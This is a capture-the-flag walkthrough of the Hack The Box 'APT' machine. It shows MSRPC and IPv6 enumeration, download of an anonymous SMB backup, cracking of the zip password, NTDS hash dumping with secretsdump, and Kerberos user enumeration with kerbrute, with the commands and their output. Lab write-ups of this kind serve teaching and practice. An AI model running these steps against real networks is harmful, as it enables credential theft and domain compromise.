### RPC - TCP 135
* https://learn.microsoft.com/en-us/troubleshoot/windows-server/networking/service-overview-and-network-port-requirements
* https://0xdf.gitlab.io/2021/04/10/htb-apt.html#rpc---tcp-135

RPC or Remote Procedure Call, is an IPC (InterProcess Communication) mechanism which allows remote invocation of functions. This can be done locally on the server or via network clients. Distributed Component Object Model (DCOM, TCP 135) allows applications to expose objects and RPC interfaces to be invoked via RPC.
A list of available interfaces provided by DCOM can be enumerated using `impacket rpcmap.py` since `rpcclient` doesn’t do much TCP 445 or TCP 139.

```bash
impacket-rpcmap -h

Lookups listening MSRPC interfaces.

positional arguments:
  stringbinding         String binding to connect to MSRPC interface, for example:
                        ncacn_ip_tcp:192.168.0.1[135]
                        ncacn_np:192.168.0.1[\pipe\spoolss]
                        ncacn_http:192.168.0.1[593]
                        ncacn_http:[6001,RpcProxy=exchange.contoso.com:443]
                        ncacn_http:localhost[3388,RpcProxy=rds.contoso:443]
                        ```

```bash
impacket-rpcmap ncacn_ip_tcp:$IP

impacket-rpcmap ncacn_ip_tcp:$IP | grep -i 'DCOM' -A2
Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote
Provider: rpcss.dll
UUID: 000001A0-0000-0000-C000-000000000046 v0.0
--
Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote
Provider: rpcss.dll
UUID: 4D9F4AB8-7D1C-11CF-861E-0020AF6E7C57 v0.0
--
Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote
Provider: rpcss.dll
UUID: 99FCFEC4-5260-101B-BBCB-00AA0021347A v0.0
```


* https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/c25391af-f59e-40da-885e-cc84076673e4

This scan provided a bunch of RPC endpoints with their UUIDs, the MS-DCOM ones (Google the UUID will get it). The one shown above is the RPC interface UUID for IObjectExporter, or the IOXIDResolver. This is know that is used for the Potato exploits. 

There’s a POC script at the bottom (I added () around the print statement so it would work with modern Python), which I’ll grab and run:

### Ipv6 and then TCP 135 again
* https://book.hacktricks.xyz/network-services-pentesting/135-pentesting-msrpc#identifying-ip-addresses
* https://github.com/A1vinSmith/IOXIDResolver

```bash
python serveralive.py
Address: apt
Address: 10.10.10.213 <- VIP+ not working, have to go with public(not private just for you) ip address
Address: dead:beef::b885:d62a:d679:573f
```

```bash
nmap -6 -p- --min-rate 10000 -oA scans/nmap-alltcp-ipv6 dead:beef::b885:d62a:d679:573f

PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49673/tcp open  unknown
49691/tcp open  unknown

smbclient -L $IP_V6 --no-pass
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        backup          Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
dead:beef::b885:d62a:d679:573f is an IPv6 address -- no workgroup available

smbclient \\\\$IP_V6\\backup --no-pass
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Sep 24 19:30:52 2020
  ..                                  D        0  Thu Sep 24 19:30:52 2020
  backup.zip                          A 10650961  Thu Sep 24 19:30:32 2020

                5114623 blocks of size 4096. 2633130 blocks available
smb: \> get backup.zip
getting file \backup.zip of size 10650961 as backup.zip (1685.0 KiloBytes/sec) (average 1685.0 KiloBytes/sec)

unzip -l backup.zip
Archive:  backup.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
        0  2020-09-23 19:40   Active Directory/
 50331648  2020-09-23 19:38   Active Directory/ntds.dit
    16384  2020-09-23 19:38   Active Directory/ntds.jfm
        0  2020-09-23 19:40   registry/
   262144  2020-09-23 19:22   registry/SECURITY
 12582912  2020-09-23 19:22   registry/SYSTEM
---------                     -------
 63193088                     6 files

john --wordlist=/usr/share/wordlists/rockyou.txt backup.zip.hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 5 OpenMP threads
iloveyousomuch   (backup.zip)

# save it to a file, and grep to get just the hashes, and there are 2000:
❯ impacket-secretsdump -ntds backup/Active\ Directory/ntds.dit -system backup/registry/SYSTEM LOCAL > backup_ad_secretdump
❯ grep ':::' backup_ad_secretdump | wc -l

# tried taking the admin hash and logging in with crackmapexec and psexc.py, and both returned invalid credentials
```

##### Check Users
* https://0xdf.gitlab.io/2021/04/10/htb-apt.html#check-users

Offical writeup from HTB is also good this time.

With 2000 users, I need a way to check how much of this is valid. Because Kerberos is available on IPv6 (TCP 88), I can use Kerbrute to check the users. I’ll get a list of just the users. 

Also, Getting kerbrute to connect to an IPv6 was a bit tricky. Just putting the address in as the DC didn’t work. Eventually I got it working using the hosts file to define the IPv6 as apt.htb. My hosts file will show both apt.htb and htb.local as this IPv6

```bash
grep ':::' backup_ad_secretdump | awk -F: '{print $1}' > users

~/kerbrute/kerbrute-arm64 userenum -d htb.local --dc apt.htb users

2023/10/30 12:57:24 >  Using KDC(s):
2023/10/30 12:57:24 >   apt.htb:88

2023/10/30 12:57:29 >  [+] VALID USERNAME:       Administrator@htb.local
2023/10/30 12:57:29 >  [+] VALID USERNAME:       APT$@htb.local
2023/10/30 13:01:41 >  [+] VALID USERNAME:       henry.vinson@htb.local
```

Only find one non-default username i.e. henry.vinson